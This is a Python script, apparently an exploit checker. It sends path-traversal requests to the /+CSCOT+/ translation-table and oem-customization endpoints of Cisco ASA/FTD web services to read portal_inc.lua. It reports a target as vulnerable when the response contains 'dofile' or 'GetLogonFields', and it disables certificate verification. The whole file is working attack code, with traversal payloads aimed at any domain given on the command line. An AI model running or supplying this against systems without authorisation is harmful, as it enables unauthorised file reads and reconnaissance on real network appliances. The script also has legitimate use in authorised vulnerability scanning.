#/usr/bin/python3 env
# encoding: utf-8



import re
import requests
import warnings
from argparse import ArgumentParser
warnings.filterwarnings("ignore")


######################################################

def exploit(domain):
    paths = [
        "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../", 
        "/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua"
    ]

    keys = [
        "dofile",
        "GetLogonFields"
    ]

    for p in paths:
        req = requests.get(
            url = "https://{}{}".format(domain, p),
            verify = False
        )

        if req.status_code == 200:
            html = req.text
            for k in keys:
                if k in html:
                    print(" [+] Vulnerable: {}".format(domain))
                    return

    print(" [-] Not vulnerable: {}".format(domain))

######################################################

def main():
    f = ArgumentParser()
    f.add_argument("-t", "--target", help="Target domain / IP address.", required=True)
    ARG = f.parse_args()

    exploit(ARG.target)

######################################################

if __name__ == "__main__":
    main()

######################################################


